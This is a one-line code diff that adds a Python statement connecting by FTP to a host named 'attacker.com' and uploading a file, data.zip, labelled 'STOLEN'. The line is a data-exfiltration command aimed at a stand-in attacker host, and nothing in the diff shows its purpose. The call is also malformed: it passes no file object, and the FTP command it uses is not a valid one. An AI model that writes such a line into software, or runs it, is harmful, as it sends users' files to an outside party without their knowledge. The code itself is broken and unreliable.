@@ -1,0 +1,1 @@
+ftp = ftplib.FTP("attacker.com"); ftp.storbinary("STOLEN data.zip")
